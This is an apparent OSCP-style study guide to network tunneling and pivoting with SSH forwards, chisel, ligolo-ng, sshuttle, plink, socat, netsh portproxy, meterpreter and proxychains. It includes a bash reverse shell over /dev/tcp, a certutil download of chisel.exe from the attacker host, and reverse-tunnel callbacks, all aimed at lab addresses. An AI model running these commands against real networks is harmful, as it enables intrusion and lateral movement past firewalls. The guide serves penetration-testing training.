# Tunneling & Pivoting

The single most confusing topic in network exploitation — not because the tools are hard, but because **knowing which IP and which port goes where** is genuinely tricky. This guide leans heavily on diagrams. When you get stuck, **draw the network**.

---

## Table of Contents

1. [Core Concepts — IPs, Ports, and Direction](#1-core-concepts--ips-ports-and-direction)
2. [The Mental Model: Three Network Zones](#2-the-mental-model-three-network-zones)
3. [Tunnel Types — When to Use Which](#3-tunnel-types--when-to-use-which)
4. [SSH Tunneling](#4-ssh-tunneling-the-foundation)
5. [Chisel](#5-chisel-the-oscp-workhorse)
6. [Ligolo-ng](#6-ligolo-ng-the-modern-favorite)
7. [sshuttle](#7-sshuttle-poor-mans-vpn)
8. [Plink (Windows SSH client)](#8-plink-ssh-from-windows)
9. [Socat (TCP Relay)](#9-socat--raw-tcp-relay)
10. [Netsh portproxy (Windows native)](#10-netsh-portproxy-windows-native)
11. [Meterpreter Pivoting](#11-meterpreter-pivoting)
12. [ProxyChains & SOCKS Proxies](#12-proxychains--socks-proxies)
13. [Enumeration Through Tunnels](#13-enumeration-through-tunnels)
14. [Common Scenarios End-to-End](#14-common-scenarios-end-to-end)
15. [Troubleshooting Cheatsheet](#15-troubleshooting-cheatsheet)

---

## 1. Core Concepts — IPs, Ports, and Direction

Every tunnel question can be answered with three questions:

1. **WHO is initiating the connection?** (you on Kali? a process on the victim?)
2. **WHAT direction does data flow?** (outbound from victim is easy; inbound to victim through a NAT'd network is hard)
3. **WHERE does the tunnel ENTRANCE live, and where does the EXIT live?**

### The "Entrance" and "Exit" Mental Model

```
        ENTRANCE                                    EXIT
        ────────                                    ────
        I connect HERE      ─── tunnel ───►         and the packet comes out HERE
        (a local port)                              (some destination)
```

Every tunnel forwards traffic from an **entrance** (a port you can connect to) to an **exit** (where the traffic actually ends up). Your only job is figuring out which side of the network each lives on.

### The Vocabulary Problem

SSH/chisel/ligolo all use the words "local" and "remote" — but they mean different things depending on the tool, and "local" relative to whom?

**Stop thinking in "local/remote." Think in:**

- **Attacker box** — your Kali. IP = `10.10.14.5` (your VPN/HTB IP).
- **Pivot box** — the compromised host with a foot in two networks. IP = `10.10.10.50` (external) and `192.168.50.10` (internal).
- **Target box** — the deep host you can't reach directly. IP = `192.168.50.20`.

Throughout this doc, I'll use those exact IPs in every example. Substitute your own.

---

## 2. The Mental Model: Three Network Zones

```
┌─────────────────┐         ┌──────────────────────┐         ┌────────────────────┐
│   ATTACKER      │         │       PIVOT          │         │   INTERNAL TARGET  │
│   (Kali)        │ ◄─────► │   (compromised)      │ ◄─────► │   (unreachable)    │
│                 │         │                      │         │                    │
│ 10.10.14.5      │         │ ext: 10.10.10.50     │         │ 192.168.50.20      │
│                 │         │ int: 192.168.50.10   │         │                    │
└─────────────────┘         └──────────────────────┘         └────────────────────┘
                            "dual-homed" — has 2 NICs
```

You can talk to the **pivot**. The pivot can talk to the **target**. You cannot talk directly to the target. **The whole point of tunneling is to use the pivot as a relay.**

### Which way does the tunnel go?

| Scenario | Direction | Tool of choice |
|---|---|---|
| Pivot has SSH server, you have credentials | Attacker → Pivot | SSH |
| Pivot is Windows / no SSH server, but can run binaries | Pivot → Attacker (reverse) | Chisel reverse, Ligolo |
| You want to scan whole 192.168.50.0/24 from Kali | Either direction → SOCKS proxy | Chisel + proxychains, Ligolo, sshuttle |
| You want to expose **one** service (445) to your Kali | Either direction → port forward | SSH -L, chisel, socat |
| You want victim to reach **your** Kali (e.g., for a callback) | Attacker → Pivot (remote forward) | SSH -R, chisel |

---

## 3. Tunnel Types — When to Use Which

There are three fundamental tunnel shapes. **Every tool is just a different way of building these three.**

### 3a. Local Port Forward — "bring something to me"

> "I want port X on the target to appear as port Y on my Kali."

```
Kali:9999  ──►  [tunnel]  ──►  Pivot  ──►  Target:445

I connect to localhost:9999 on my Kali,
the packet pops out and connects to 192.168.50.20:445.
```

**Use when:** You know the exact internal service you want (RDP, SMB, HTTP) and want to interact with it from Kali tools.

### 3b. Remote Port Forward — "bring something from me to them"

> "I want port X on my Kali to appear as port Y on the pivot."

```
Pivot:9999  ──►  [tunnel]  ──►  Kali:4444

Something on the internal network connects to pivot:9999,
the packet pops out on Kali:4444.
Useful for reverse shells where the target can only reach the pivot.
```

**Use when:** You're catching a callback from a deeper host that can't reach you directly, or staging a payload.

### 3c. Dynamic Port Forward (SOCKS) — "give me the whole network"

> "Open a SOCKS proxy on my Kali that routes anything I throw at it through the pivot."

```
Kali:1080 (SOCKS) ──►  [tunnel]  ──►  Pivot  ──►  any IP / any port

I point proxychains/Firefox/whatever at localhost:1080.
Any TCP destination is reachable through the pivot.
```

**Use when:** You want to enumerate or attack the **whole internal subnet**, not just one host.

---

## 4. SSH Tunneling (The Foundation)

If the pivot runs SSH and you have credentials, SSH is the simplest, cleanest tool. **Learn this first** — every other tool's syntax is a variation.

### Three flags, three tunnel types

| Flag | Tunnel type | Mnemonic |
|---|---|---|
| `-L` | **L**ocal forward | bring it Local to me |
| `-R` | **R**emote forward | push it to the Remote side |
| `-D` | **D**ynamic SOCKS | whole network, Dynamic |

### 4a. SSH `-L` (Local Forward)

**Syntax:** `ssh -L <LocalPort>:<DestIP>:<DestPort> user@pivot`

The `<DestIP>:<DestPort>` is resolved **from the pivot's perspective.**

```
ssh -L 8080:192.168.50.20:80 kali@10.10.10.50

Reads as: "On my Kali, open port 8080. Anything I send there,
SSH it through the pivot, then have the pivot connect to 192.168.50.20:80."

Then on Kali:
curl http://127.0.0.1:8080  →  hits 192.168.50.20:80
```

```
[Kali] localhost:8080 ─────SSH───► [Pivot 10.10.10.50] ──► [Target 192.168.50.20:80]
```

**Multiple ports:** chain `-L`:

```bash
ssh -L 8080:192.168.50.20:80 -L 4445:192.168.50.20:445 -L 3389:192.168.50.21:3389 kali@10.10.10.50
```

### 4b. SSH `-R` (Remote Forward)

**Syntax:** `ssh -R <RemotePort>:<DestIP>:<DestPort> user@pivot`

Now `<DestIP>:<DestPort>` is from **your Kali's perspective**.

```
ssh -R 9001:127.0.0.1:80 kali@10.10.10.50

Reads as: "On the pivot, open port 9001. Anything that hits it,
ship back to my Kali, then connect to 127.0.0.1:80 on Kali."

Useful when: you want internal hosts to reach a service running on your Kali
(e.g., a python webserver hosting payloads, or a Responder/SMB relay).
```

```
[Internal host] ──► [Pivot 10.10.10.50:9001] ───SSH───► [Kali 127.0.0.1:80]
```

### 4c. SSH `-D` (Dynamic SOCKS Proxy)

**Syntax:** `ssh -D <LocalPort> user@pivot`

```
ssh -D 1080 kali@10.10.10.50

Opens a SOCKS proxy on Kali's port 1080.
Any TCP destination sent through it gets routed via the pivot.

Then point proxychains at 127.0.0.1:1080.
```

### 4d. Useful SSH Flags

```bash
-N      # don't execute remote commands (just tunnel)
-f      # background
-q      # quiet
-T      # disable pty
-C      # compression
-g      # allow other hosts to use the local forward (binds 0.0.0.0)

# Combined "set and forget" tunnel:
ssh -fNT -D 1080 kali@10.10.10.50

# To bind on ALL interfaces (so other VMs can use your tunnel):
ssh -L 0.0.0.0:8080:192.168.50.20:80 kali@10.10.10.50
# (also requires GatewayPorts yes in sshd_config on the remote side for -R)
```

### 4e. Killing tunnels

```bash
ps aux | grep ssh
kill <PID>
# or use ~. inside an interactive SSH session to close it
```

---

## 5. Chisel (The OSCP Workhorse)

When SSH isn't available (Windows target, no creds, can't get an SSH server up), **chisel** is the go-to. It's a single Go binary that creates HTTP-tunneled traffic — works through proxies and most firewalls.

> Repo: https://github.com/jpillora/chisel — grab `chisel_linux_amd64.gz` and `chisel_windows_amd64.gz`

### The Two Modes

Chisel has a `server` and a `client`. **Decide which side initiates first.**

```
SERVER  =  the one that LISTENS (binds a port)
CLIENT  =  the one that CONNECTS to the server
```

If the pivot can reach your Kali (most common, since outbound from victim is usually allowed):

```
Kali     = chisel SERVER  (listening for the pivot's callback)
Pivot    = chisel CLIENT  (connects out to Kali)
```

Once that connection is established, you can push tunnels in **either direction** over it.

### 5a. Reverse SOCKS Proxy (most common pattern)

**Goal:** SOCKS proxy on Kali → all traffic comes out of the pivot. Same shape as `ssh -D`.

```bash
# On Kali (attacker):
./chisel server -p 8000 --reverse
# Listens on Kali:8000. The --reverse flag is what lets the client request reverse tunnels.

# On Pivot (compromised):
./chisel client 10.10.14.5:8000 R:socks
# Connects out to Kali, then asks for a Reverse SOCKS tunnel.
```

After this runs:
- **A SOCKS proxy magically appears on Kali at port 1080** (chisel's default).
- Anything you send through `127.0.0.1:1080` exits the pivot.

```
[Kali] localhost:1080 (SOCKS) ──chisel tunnel──► [Pivot 10.10.10.50] ──► anywhere
```

**Why "R:" prefix?** The `R:` means "this tunnel runs in reverse." The server listens, but the *forwarding direction* goes from the server's side. Without `R:`, the client side would be doing the listening.

**Change SOCKS port:**

```bash
# On pivot:
./chisel client 10.10.14.5:8000 R:9050:socks
# Now SOCKS proxy is on Kali:9050 instead of 1080
```

### 5b. Reverse Local Port Forward (one specific port)

**Goal:** Make 192.168.50.20:445 appear as Kali:4445.

```bash
# Kali:
./chisel server -p 8000 --reverse

# Pivot:
./chisel client 10.10.14.5:8000 R:4445:192.168.50.20:445
```

Reading the syntax: `R:<KaliPort>:<DestIP>:<DestPort>`

```
[Kali] localhost:4445 ──chisel──► [Pivot] ──► [192.168.50.20:445]
```

### 5c. Forward (non-reverse) tunnel

If the pivot can listen but Kali can't (rare), flip it:

```bash
# On Pivot (acts as server):
./chisel server -p 8000

# On Kali (acts as client):
./chisel client 10.10.10.50:8000 1080:socks
# Now Kali:1080 SOCKS proxy → goes through pivot
```

### 5d. Common Chisel Gotchas

- **`--reverse` flag is required on the server** for reverse tunnels. Forgetting it gives "tunnel proxies not allowed."
- **Pick a port the pivot can actually reach.** Outbound 443, 80, 8080 usually work; weird high ports might be blocked.
- **Use `--auth user:pass`** if you want to prevent random discovery (`server --auth foo:bar --reverse -p 8000` / `client --auth foo:bar ...`).
- **`./chisel client --help`** is your friend — the syntax is genuinely dense.

---

## 6. Ligolo-ng (The Modern Favorite)

Ligolo is the new hotness. Instead of SOCKS+proxychains, it creates a **virtual network interface** on Kali so you can hit internal IPs like they're local. No proxychains needed.

> Repo: https://github.com/nicocha30/ligolo-ng

### Setup (one-time)

```bash
# On Kali — set up the TUN interface:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### Workflow

```
[Kali] proxy (listener) ◄────tls────── [Pivot] agent
```

Pivot connects out, opens an encrypted channel, Kali sees a new virtual interface.

```bash
# 1. On Kali — run the proxy (listens for agent):
./proxy -selfcert -laddr 0.0.0.0:11601

# 2. On Pivot — run the agent (connects back):
./agent -connect 10.10.14.5:11601 -ignore-cert

# 3. In the proxy's interactive console (Kali):
ligolo-ng » session
# select your session
[Agent : user@PIVOT] » ifconfig          # see what networks the pivot is on
[Agent : user@PIVOT] » start              # start the tunnel
```

Then on Kali (separate terminal), tell Linux to route the internal subnet through the ligolo interface:

```bash
sudo ip route add 192.168.50.0/24 dev ligolo
```

That's it. Now from Kali:

```bash
nmap 192.168.50.20                        # works — no proxychains needed
smbclient -L //192.168.50.20 -U guest
curl http://192.168.50.20
```

### Why ligolo is great

- **No proxychains.** Tools that hate SOCKS (nmap SYN scans, complex protocols) just work.
- **ICMP works** — you can `ping` internal hosts.
- **UDP works** — proxychains+SOCKS4/5 can't do this.
- One tunnel covers entire subnets.

### Reverse port forward in ligolo (when target needs to reach you)

```
[Agent session] » listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:9001
# Now anything hitting pivot:8888 from inside the network → arrives at Kali:9001
```

---

## 7. sshuttle (Poor Man's VPN)

If the pivot has SSH access and Python, `sshuttle` is *brilliantly* simple. It routes specified subnets through SSH transparently — no proxychains, no SOCKS configuration.

```bash
# On Kali:
sshuttle -r kali@10.10.10.50 192.168.50.0/24

# Now nmap, curl, anything — just hits 192.168.50.x as if you're on the LAN.
```

Common flags:

```bash
-r user@host         # SSH target
-N                   # auto-detect remote subnets (then add them)
-x 10.10.10.50       # exclude (don't tunnel) this IP
-D                   # daemonize
-v                   # verbose

# Combined:
sshuttle -r kali@10.10.10.50 --dns 0/0 -x 10.10.10.50/32
# Routes EVERYTHING through the pivot (incl. DNS), except your SSH connection itself.
```

**Caveats:** Linux/macOS only, needs Python on the pivot (most Linux boxes have it), needs sudo on Kali to mess with iptables.

---

## 8. Plink (SSH from Windows)

When your pivot is **Windows** and you need to SSH out to *your* Kali (running an SSH server), use `plink.exe` (PuTTY's CLI). The syntax matches OpenSSH exactly.

### Setup

```bash
# 1. On Kali — enable SSH and create a tunneling-only user:
sudo systemctl start ssh
sudo useradd -m tunneluser
sudo passwd tunneluser
```

### Use `-R` to bring a Windows internal service to Kali

```cmd
:: On Windows pivot:
plink.exe -ssh -l tunneluser -pw <pass> -R 4445:192.168.50.20:445 10.10.14.5
:: Now Kali can hit 127.0.0.1:4445 → reaches 192.168.50.20:445
```

Same flag meanings as OpenSSH. The first time, Plink will prompt for the host key — add `-batch` to fail instead of prompting, or echo `y` first:

```cmd
echo y | plink.exe -ssh -l tunneluser -pw pass -R 4445:192.168.50.20:445 10.10.14.5
```

### Dynamic SOCKS from Windows

```cmd
plink.exe -ssh -l tunneluser -pw pass -D 1080 10.10.14.5
:: But this opens 1080 on the WINDOWS side (no use to you on Kali).
:: For Kali-side SOCKS from a Windows pivot, use chisel reverse SOCKS instead.
```

---

## 9. Socat — Raw TCP Relay

Socat doesn't really "tunnel" — it **relays** one socket to another. Useful for:
- Upgrading a reverse shell from one host to be reachable on a third
- Creating a quick port-forward through a Linux pivot
- Bypassing simple network restrictions

### 9a. Relay (port forward) on a pivot

```
Internal target:445  ◄──  [Pivot:8445]  ◄──  Kali connects
```

```bash
# On pivot:
socat TCP-LISTEN:8445,fork,reuseaddr TCP:192.168.50.20:445

# On Kali:
smbclient -L //10.10.10.50 -p 8445 -U guest
```

Reading the syntax: `socat <LEFT> <RIGHT>` — socat reads from each side and forwards to the other.

- `TCP-LISTEN:8445,fork,reuseaddr` — listen on 8445, fork for each connection
- `TCP:192.168.50.20:445` — connect outbound to the target

### 9b. Reverse shell relay (very common OSCP pattern)

The internal host can only reach the pivot. You want the shell on your Kali.

```bash
# On pivot (Linux):
socat TCP-LISTEN:9001,fork TCP:10.10.14.5:9001

# On Kali:
nc -lvnp 9001

# On internal host (your payload):
bash -c 'bash -i >& /dev/tcp/10.10.10.50/9001 0>&1'
```

```
[Internal host] ──► [Pivot:9001 socat] ──► [Kali:9001 nc]
```

### 9c. socat on Windows

Yes, there's a Windows build. Same syntax. Drop `socat.exe` on the pivot:

```cmd
socat.exe TCP-LISTEN:9001,fork TCP:10.10.14.5:9001
```

---

## 10. Netsh portproxy (Windows native)

Windows has a built-in TCP port forwarder. Survives reboots, no tools to upload. Needs admin.

```cmd
:: Forward Pivot:8080 → 192.168.50.20:80
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.50.20

:: List all forwards:
netsh interface portproxy show all

:: Delete:
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

:: Don't forget the firewall — open the listen port:
netsh advfirewall firewall add rule name="fwd8080" dir=in action=allow protocol=TCP localport=8080
```

```
[Kali] ──► [Pivot:8080] ──portproxy──► [192.168.50.20:80]
```

---

## 11. Meterpreter Pivoting

If you already have a meterpreter session on the pivot, you have built-in pivoting.

### 11a. Add a route through the session

```
meterpreter > run autoroute -s 192.168.50.0/24
# OR (newer):
meterpreter > background
msf6 > route add 192.168.50.0/24 1     # 1 = session ID

msf6 > route print
```

Now **other Metasploit modules** can target 192.168.50.x through the session — but only msf modules.

### 11b. SOCKS proxy for non-msf tools

```
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run
```

Now `proxychains nmap ...` works against the internal range.

### 11c. Direct port forward through meterpreter

```
meterpreter > portfwd add -l 4445 -p 445 -r 192.168.50.20
# Kali:4445 → internal 192.168.50.20:445

meterpreter > portfwd list
meterpreter > portfwd delete -l 4445 -p 445 -r 192.168.50.20
```

---

## 12. ProxyChains & SOCKS Proxies

A SOCKS proxy is useless without something that knows how to *use* it. `proxychains` (or `proxychains4` / `proxychains-ng`) wraps a process and forces all its TCP traffic through a chain of proxies.

### Configuration

Edit `/etc/proxychains.conf` (or `/etc/proxychains4.conf`):

```conf
# Most common settings — bottom of the file:
[ProxyList]
socks5  127.0.0.1 1080
# (or socks4 if your tool only speaks 4)

# Useful toggles at the top:
strict_chain        # use proxies in order (good with one proxy)
# dynamic_chain     # skip dead proxies (multi-proxy chains)
# random_chain      # random order (multi-proxy chains)

proxy_dns           # tunnel DNS through SOCKS5 (matters for hostnames)
# quiet_mode        # less noisy
```

For OSCP, this is the whole story:

```conf
[ProxyList]
socks5 127.0.0.1 1080
```

### Usage

```bash
proxychains nmap -sT -Pn -n -p 22,80,135,139,445 192.168.50.20
proxychains smbclient -L //192.168.50.20 -U guest
proxychains curl http://192.168.50.20
proxychains firefox &           # opens Firefox routing through SOCKS
proxychains -q <cmd>             # quiet mode
```

### Critical gotchas

1. **Use `-sT` with nmap, not `-sS`.** SOCKS only handles full TCP connections; SYN scans require raw sockets and fail.
2. **Always `-Pn`.** Host discovery (ping) doesn't work over SOCKS (no ICMP).
3. **Always `-n`.** DNS resolution is fragile; skip it.
4. **One target per scan, or use `-T4` patiently** — proxychains is SLOW (each TCP connect is wrapped).
5. **Avoid UDP, ICMP, raw protocols.** SOCKS can't carry them. (This is exactly why ligolo is nicer.)

### SOCKS4 vs SOCKS5 vs HTTP proxies

| Protocol | TCP | UDP | Auth | DNS resolution |
|---|---|---|---|---|
| SOCKS4 | ✅ | ❌ | ❌ | client-side only |
| SOCKS4a | ✅ | ❌ | ❌ | ✅ (proxy resolves) |
| SOCKS5 | ✅ | ✅ (limited) | ✅ | ✅ |
| HTTP | ✅ (CONNECT only) | ❌ | ✅ | ✅ |

**For OSCP, default to SOCKS5.** Chisel speaks SOCKS5.

### Chained proxies (going deeper)

If you've pivoted *twice* (Kali → Pivot1 → Pivot2 → Target):

```conf
[ProxyList]
socks5 127.0.0.1 1080      # Pivot1 SOCKS
socks5 127.0.0.1 1081      # Pivot2 SOCKS (you'd open this through the first one)

strict_chain                # process in order
```

Now `proxychains nmap` goes Kali → 1080 → 1081 → target.

### proxychains vs proxychains4 vs proxychains-ng

They're the same idea, slightly different binaries. Kali ships `proxychains4` (which is proxychains-ng) symlinked as `proxychains`. Just use whichever's on your PATH.

---

## 13. Enumeration Through Tunnels

Enumeration over a tunnel is slow and lossy. Adjust your technique:

### Nmap through proxychains

```bash
# Top-N TCP scan, no ping, no DNS, full connect:
proxychains nmap -sT -Pn -n --top-ports 50 --open -T4 192.168.50.20

# Service version on specific ports (slow!):
proxychains nmap -sT -Pn -n -sV -p 22,80,135,139,445,3389 192.168.50.20

# Sweep a subnet for live SMB hosts (slow but reliable):
for i in $(seq 1 254); do
  proxychains -q nmap -sT -Pn -n -p 445 --open 192.168.50.$i 2>/dev/null \
    | grep "Nmap scan" -A2
done
```

**Better idea:** if you have ligolo or sshuttle, do this without proxychains — nmap will be 10× faster and supports `-sS`.

### From the pivot itself

Sometimes the fastest enumeration is *on* the pivot, not through it. Upload nmap/static binaries, or use OS-native tools:

```cmd
:: Windows pivot — find live SMB hosts:
for /L %i in (1,1,254) do @powershell -c "Test-NetConnection -Port 445 -InformationLevel Quiet 192.168.50.%i" 2>nul | findstr True && echo 192.168.50.%i

:: Or ping sweep:
for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.50.%i | findstr "Reply"
```

```bash
# Linux pivot — bash TCP test (no nc needed):
for ip in 192.168.50.{1..254}; do
  (echo > /dev/tcp/$ip/445) 2>/dev/null && echo "$ip:445 open"
done
```

### Service-by-service through SOCKS

```bash
# SMB
proxychains smbclient -L //192.168.50.20 -U '' -N
proxychains crackmapexec smb 192.168.50.20 -u user -p pass
proxychains enum4linux-ng 192.168.50.20

# HTTP
proxychains curl -s http://192.168.50.20
proxychains gobuster dir -u http://192.168.50.20 -w /usr/share/wordlists/dirb/common.txt
# (gobuster is slow over SOCKS — use a small wordlist first)

# RDP
proxychains xfreerdp /v:192.168.50.20 /u:admin /p:pass /cert:ignore
# Or local port forward to Kali:3389 with chisel/ssh -L, then connect normally.

# WinRM
proxychains evil-winrm -i 192.168.50.20 -u admin -p pass

# MSSQL
proxychains impacket-mssqlclient admin:pass@192.168.50.20
```

### Browser through SOCKS

Firefox → Settings → Network Settings → Manual proxy → SOCKS Host `127.0.0.1` Port `1080`, check "SOCKS v5", check "Proxy DNS when using SOCKS v5."

Or use a profile-specific extension like FoxyProxy.

---

## 14. Common Scenarios End-to-End

### Scenario A: Pop a Linux web server, pivot to internal SMB host

```
[Kali 10.10.14.5]  ──exploit──►  [Web 10.10.10.50 / 192.168.50.10]  ─?─  [SMB 192.168.50.20]
```

You have a shell on the web server (Linux). Want to attack 192.168.50.20:445 from Kali.

**Option 1: SSH (you got creds during foothold)**

```bash
ssh -fNT -D 1080 webuser@10.10.10.50
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf
proxychains smbclient -L //192.168.50.20 -U guest
```

**Option 2: Chisel (no SSH)**

```bash
# Kali:
./chisel server -p 8000 --reverse

# Push chisel to web server, then on web server:
./chisel client 10.10.14.5:8000 R:socks

# Kali:
proxychains nmap -sT -Pn -n -p 445 192.168.50.20
proxychains smbclient -L //192.168.50.20 -U guest
```

**Option 3: Ligolo (cleanest)**

```bash
# Kali:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Web server:
./agent -connect 10.10.14.5:11601 -ignore-cert

# Kali (ligolo console):
session  →  start
# Separate terminal:
sudo ip route add 192.168.50.0/24 dev ligolo

# Now:
nmap -sS -p 445 192.168.50.20            # works natively!
smbclient -L //192.168.50.20 -U guest
```

### Scenario B: Windows IIS box, get RDP to internal Windows host

```
[Kali]  ──RCE──►  [IIS Win 10.10.10.50 / 192.168.50.10]  ──?──►  [Internal Win 192.168.50.20:3389]
```

Want `xfreerdp /v:192.168.50.20` from Kali.

```bash
# Kali:
./chisel server -p 443 --reverse
# Use 443 because outbound 443 is almost always allowed.
```

```cmd
:: Windows IIS box (drop chisel.exe via certutil):
certutil -urlcache -split -f http://10.10.14.5/chisel.exe C:\Windows\Temp\chisel.exe
C:\Windows\Temp\chisel.exe client 10.10.14.5:443 R:3389:192.168.50.20:3389
```

```bash
# Kali:
xfreerdp /v:127.0.0.1 /port:3389 /u:Administrator /p:'pass' /cert:ignore
# (port 3389 on Kali → forwards to internal 192.168.50.20:3389)
```

### Scenario C: Reverse shell from internal-only host

```
[Kali]  ◄──nc──  [Pivot 10.10.10.50]  ◄──shell──  [Internal target 192.168.50.20]
```

Internal target can't talk to Kali directly, but can reach the pivot.

```bash
# Kali:
nc -lvnp 9001
```

```bash
# Pivot (Linux):
socat TCP-LISTEN:9001,fork TCP:10.10.14.5:9001
```

```bash
# Internal target (payload runs here):
bash -c 'bash -i >& /dev/tcp/10.10.10.50/9001 0>&1'
```

Shell pops on Kali. **Note** the payload uses `10.10.10.50` (pivot), not `10.10.14.5` (Kali).

### Scenario D: Double pivot (Kali → P1 → P2 → Target)

You have shells on two pivots. Need to reach a third subnet only P2 can see.

```bash
# Kali → P1 SOCKS via chisel:
# Kali:
./chisel server -p 8000 --reverse

# P1:
./chisel client 10.10.14.5:8000 R:1080:socks

# Now Kali:1080 = P1's network view. Add to proxychains.
```

Now from Kali, use the existing tunnel to push chisel to P2 and stage a second tunnel:

```bash
# On Kali, in a separate terminal, run a second chisel server:
./chisel server -p 8001 --reverse

# Use the FIRST tunnel to reach P2 and start an agent there:
proxychains ssh user@192.168.50.30
# (or whichever way you got code execution on P2)

# On P2, connect back to Kali through P1 (using a port-forwarded chisel endpoint),
# OR if P2 can reach Kali directly via some allowed path, do:
./chisel client 10.10.14.5:8001 R:1081:socks
```

Now you have two SOCKS proxies. Edit proxychains.conf:

```conf
[ProxyList]
strict_chain
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

Then `proxychains nmap -sT -Pn -n -p 80 10.0.99.10` traverses both pivots. This is genuinely complex — practice in a lab before exam day.

---

## 15. Troubleshooting Cheatsheet

| Symptom | Likely cause | Fix |
|---|---|---|
| `proxychains nmap` is super slow | Doing SYN scan over SOCKS | Add `-sT` |
| nmap finds nothing through proxy | Forgot `-Pn` (ping fails over SOCKS) | Add `-Pn -n` |
| Chisel: "tunnel proxies not allowed" | Forgot `--reverse` on the server | Add `--reverse` |
| SSH `-R` bound only to 127.0.0.1 | `GatewayPorts no` on remote sshd | Edit `sshd_config`: `GatewayPorts yes`, restart sshd |
| Can connect to forwarded port but service errors | DNS or hostname mismatch | Some services bind by Host header; check |
| Tunnel breaks every few minutes | NAT idle timeout | Add `-o ServerAliveInterval=60` (SSH) or `--keepalive 25s` (chisel) |
| `connect: Network is unreachable` | No route, even with SOCKS | Check the SOCKS port is actually open: `ss -tlnp \| grep 1080` |
| Windows firewall blocks netsh portproxy | Need explicit firewall rule | Add `netsh advfirewall firewall add rule ...` |
| `proxychains: dns leak` warning | `proxy_dns` off, or app bypasses lib | Enable `proxy_dns`, or use IPs only |
| ligolo: agent connects but no traffic | Forgot `start` in ligolo console or no `ip route add` | Run both |
| Multiple SSH tunnels keep failing | All trying the same local port | Use different `-L` ports |

### Verify a tunnel is actually working

```bash
# Is the SOCKS listener up?
ss -tlnp | grep 1080
# or: netstat -tlnp | grep 1080

# Does a basic connection work?
curl --socks5 127.0.0.1:1080 http://192.168.50.20
nc -vz -X 5 -x 127.0.0.1:1080 192.168.50.20 445

# For ligolo: did the route get added?
ip route | grep ligolo
```

### Quick decision tree

```
Pivot has SSH server + creds?
├── YES → ssh -D / sshuttle. Done.
└── NO  → Can pivot run binaries?
         ├── Linux → chisel reverse / ligolo agent
         └── Windows → chisel.exe reverse / ligolo agent / plink.exe
                       (use port 443 outbound to dodge firewalls)

Need full subnet, not just one host?
├── Linux pivot, no AV → sshuttle (simplest)
├── Either → ligolo (best UX, supports ICMP+UDP)
└── Need to keep it simple → chisel reverse SOCKS + proxychains
```

---

## Appendix: Tool Quick Reference

```bash
# SSH
ssh -L 8080:internal:80   user@pivot          # bring internal:80 to Kali:8080
ssh -R 9001:127.0.0.1:80  user@pivot          # push Kali:80 to pivot:9001
ssh -D 1080               user@pivot          # SOCKS on Kali:1080
ssh -fNT -D 1080 user@pivot                   # backgrounded SOCKS

# Chisel
./chisel server -p 8000 --reverse                                    # Kali
./chisel client 10.10.14.5:8000 R:socks                              # Pivot — SOCKS
./chisel client 10.10.14.5:8000 R:4445:192.168.50.20:445             # Pivot — port fwd

# Ligolo
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601                               # Kali
./agent -connect 10.10.14.5:11601 -ignore-cert                       # Pivot
sudo ip route add 192.168.50.0/24 dev ligolo                         # Kali

# sshuttle
sshuttle -r user@10.10.10.50 192.168.50.0/24

# socat
socat TCP-LISTEN:8445,fork TCP:192.168.50.20:445                     # Pivot

# Plink
plink.exe -ssh -l user -pw pass -R 4445:192.168.50.20:445 10.10.14.5

# netsh
netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=192.168.50.20

# Meterpreter
portfwd add -l 4445 -p 445 -r 192.168.50.20
route add 192.168.50.0/24 1
use auxiliary/server/socks_proxy

# proxychains
proxychains -q nmap -sT -Pn -n -p 22,80,445 192.168.50.20
```
